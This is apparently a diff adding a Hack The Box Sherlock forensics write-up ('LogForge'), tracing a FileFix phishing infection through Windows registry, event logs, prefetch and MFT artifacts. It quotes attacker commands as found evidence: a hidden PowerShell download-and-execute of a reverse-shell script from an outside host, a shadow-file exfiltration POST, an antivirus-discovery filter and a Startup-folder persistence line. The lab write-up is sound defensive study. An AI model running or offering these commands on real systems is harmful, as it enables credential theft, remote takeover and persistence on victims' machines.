@@ -3257,3 +3257,142 @@ base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
 base64 /etc/passwd | curl -X POST -d @- http://192.168.161.198/steal.php
 ```
 **$\rightarrow$ Đáp án: `base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php`**
+
+### V. LogForge:
+> - Link lab: https://app.hackthebox.com/sherlocks/LogForge?tab=play_sherlock
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/By95BIhAWe.png)
+> - File được cho:
+> ![image](https://hackmd.io/_uploads/rkCmd830Wx.png)
+> - Timezone:
+> ![image](https://hackmd.io/_uploads/Skr0pI30Wg.png)
+
+#### 1. When was the user's last successful login to the system?
+- Extract the `SAM` hive by using FTK Imager and go to `C:\Windows\System32\Config`.
+- Using Registry Explorer and going to `SAM\Domains\Account\Users` to find the last time when the user successfuly login to the system:
+![image](https://hackmd.io/_uploads/Hki-D62Rbg.png)
+But `2025-08-11 06:46:52` is not the correct answer.
+- Extract `C:\Windows\System32\winevt\Logs\Security.evtx` in FTK Imager, then use `EvtxECmd.exe` to analyse the `Security.evtx` by using CMD:
+    ``` cmd
+    "C:\Users\[Users]\Downloads\EvtxECmd\EvtxeCmd\EvtxECmd.exe" -f "C:\Users\[Users]\Desktop\Security.evtx" --csv "C:\Users\[Users]\Desktop" --csvf "Analyzed_Security.csv"
+    ```
+- Open `Analyzed_Security.csv` and filter Event ID `4624`, then find the lastest event:
+![image](https://hackmd.io/_uploads/r1_nu6n0Wg.png)
+
+The answer: `2025-08-11 06:57:11`
+
+#### 2. When did the victim last open the browser they regularly used on the system
+Extracting `NTUSER.DAT` in `C:\Users\user\` by using FTK Imager. Then using Registry Explorer to analyse and going to `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`.
+![image](https://hackmd.io/_uploads/HJdzCpnCWx.png)
+The answer: `2025-08-11 07:12:17`
+
+#### 3. The user accessed a malicious website as a result of phishing attempt. What is the URL?
+Using FTK Imager to extract the file `C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Default\History`. Then access `https://inloop.github.io/sqlite-viewer/` and upload the file `History`. Execute the query command `SELECT * FROM 'urls'`:
+![image](https://hackmd.io/_uploads/HkIN6R3A-g.png)
+Perhaps `https://cool-bunny-55393d.netlify.app/` is the supecious link. And it's the correct answer.
+> I think this is the sign of phishing attempt:
+![image](https://hackmd.io/_uploads/S17NCChC-g.png)
+
+#### 4. After the user visited the website, they were directed to copy a command from the website and enter it into the File Explorer search bar. Shortly after, strange behavior was noticed. What is the full URL that installed the reverse shell on the victim's device?
+To find the command entered into the File Explorer search bar, using Registry Explorer and going to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`:
+![image](https://hackmd.io/_uploads/HyK671pC-g.png)
+We can see the reverse shell command, and the answer is `http://192.168.26.128:8000/rev.ps1`.
+> The reverse shell command:
+> ``` powershell
+> powershell -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(''http://192.168.26.128:8000/rev.ps1'')'" #                     chrome.exe --update --fix --hash="1e693edc-bcc1-4503-b898-7c0b2899d03c"
+> ```
+
+#### 5. This attack preys on non-technical users by luring them into traps and manipulating them into unknowingly executing commands on the system. Based on the analysis of the previously identified command, what is this type of attack called?
+The answer is`FileFix`, a variant of ClickFix.
+> More information of ClickFix Attack: [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)
+
+#### 6. After the attack, the user noticed that Notepad had opened with a message left by the attacker. What is the email address of the attacker?
+- Export `$MFT` by using FTK Imager and analyse in Command Prompt with command:
+    ``` cmd
+    "C:\Users\Ha Nguyen\Downloads\MFTECmd\MFTECmd.exe" -f "C:\Users\Ha Nguyen\Desktop\$MFT" --csv "C:\Users\Ha Nguyen\Desktop" --csvf "MFT_Parsed.csv" --dr
+    ```
+    ![image](https://hackmd.io/_uploads/HyTOIt3yGl.png)
+    > `--dr` (Drive letter remapping/Delete/Re-create): To analyse special records or overwrite/delete old files automatically if files with the same name are existing in the export folder.
+- In the output folder `Resident`, there is a file having the name `93420-8-1_README.txt.bin`, check the data of this file:
+![image](https://hackmd.io/_uploads/rJLjdYhJfe.png)
+The answer: `0xSh3rl0cK@protonmail.com
+
+#### 7. The attacker downloaded malware to infect the victim's device. What is the full path of the malicious malware file.
+- When an app run, a prefetch fill will be created. Using FTK Imager, going to `Windows\prefetch\` and exporting this folder. Then opening CMD:
+``` cmd
+PECmd.exe -d "C:\Users\Ha Nguyen\Desktop\prefetch" --csv "C:\Users\Ha Nguyen\Desktop" --csvf "Intranet_Prefetch_Parsed.csv"
+```
+- Using Timeline Explorer to analyse `Intranet_Prefetch_Parsed_Timeline.csv`. We will find the suspecious file having the timeline after `2025-08-11 07:12:17`:
+![image](https://hackmd.io/_uploads/BkWyDlCyzg.png)
+The answer: `C:\Windows\Temp\WindowsUpdate.exe`
+
+#### 8. What is the product name of this malicious file
+- Using FTK Imager to go to `C/Windows/System32/winevt/logs` and export `Microsoft-Windows-Sysmon%4Operational`.
+![image](https://hackmd.io/_uploads/rkxmzeSbzg.png)
+- Open this file in Event Viewer, then filter processes that have the Event ID `1` and find the process of `C:\Windows\Temp\WindowsUpdate.exe`:
+![image](https://hackmd.io/_uploads/SyZZ7gS-zl.png)
+The answer: `Virtuoso`
+
+#### 9. The malware created several directories on the system. Under which path were these files created?
+Filtering Event ID 11 (FileCreate), we can see that there are several directories created in `C:\Windows\`:
+![image](https://hackmd.io/_uploads/SkH92eBWMx.png)
+![image](https://hackmd.io/_uploads/SJdo2xrbGe.png)
+![image](https://hackmd.io/_uploads/rylphlrWfg.png)
+![image](https://hackmd.io/_uploads/SkApneS-fg.png)
+![image](https://hackmd.io/_uploads/HycRnlrZfx.png
+
+#### 10. A script file was staged on the machine by the malware. What is the full command used to achieve this
+- Execute the command below in CMD to extract `.csv` file:
+![image](https://hackmd.io/_uploads/HJmbN-rWGe.png)
+- Open this file, then filter to find the process that have Event ID `1` and Parent Process `WindowsUpdate.exe`:
+![image](https://hackmd.io/_uploads/SyEiEWHWMg.png)
+`"C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat &amp; Cricket.bat` is the wrong answer, but when I went back to Event Viewer, at the detail of the event located above the event of `WindowsUpdate.exe`, I found this:
+![image](https://hackmd.io/_uploads/BJ62H-S-Mx.png)
+The answer: `"C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat & Cricket.bat
+
+#### 11. What is the full path of the staged script file?
+The script file needed to find is `Cricket.bat`. Filter the process that have Event ID `11`:
+![image](https://hackmd.io/_uploads/S1eDURHIbfl.png)
+The answer: `C:\Users\user\AppData\Local\Temp\Cricket.bat`
+
+#### 12. The attacker dropped an automation utility on the system with a legacy file format. What is the full path of this newly dropped file?
+At the event above the event in Task 11:
+![image](https://hackmd.io/_uploads/Sy8eyLL-fg.png)
+When we filter the process having Event ID `1`:
+![image](https://hackmd.io/_uploads/S1dHxUIbfg.png)
+The answer is `C:\Users\user\AppData\Local\Temp\316094\Intranet.pif`.
+> `.pif` - Program Information File: The file that contain the program information of MS-DOS programs.
+
+#### 13. What is the name and version of the utility?
+In Event Viewer, filter the process having Event ID `1`:
+![image](https://hackmd.io/_uploads/r1BwzIUWGl.png)
+Explain the above information:
+- Description: `AutoIt v3 Script`
+- Product: `AutoIt v3 Script`
+- Company: `AutoIt Team`
+- Version: `3, 3, 14, 3` or `3.3.14.3`
+- Original: `AutoIt3.exe`
+
+I tried with `AutoIt v3 Script 3.3.14.3`, but is was wrong. The answer is `AutoIt 3.3.14.3`.
+
+#### 14. Using this utility, the attacker dropped another script on the system. What is the name of this script?
+At the event above the event in Task 13:
+![image](https://hackmd.io/_uploads/SkULIULbGg.png)
+The answer: `Virtuoso.js`
+
+#### 15. In order to evade defenses for unattended access, the malware executed commands to look for EDR and antivirus presence on the system. What is the full command line of the second command used to achieve this?
+I found this:
+![image](https://hackmd.io/_uploads/B1pAewIWzg.png)
+The answer: `findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth"`
+> Explain the command: List all features needed to check in the system:
+> - `avastui`: Avast Antivirus UI
+> - `avgui`: AVG Antivirus UI
+> - `bdservicehost`: Bitdefender Service Process
+> - `nswscsvc`: Norton Security/Norton WSC Service
+> - sophoshealth`: Sophos Health Service
+
+#### 16. What is the full command used to set up persistence on the system
+At the event in Task 14. The answer:
+```
+cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit
+```
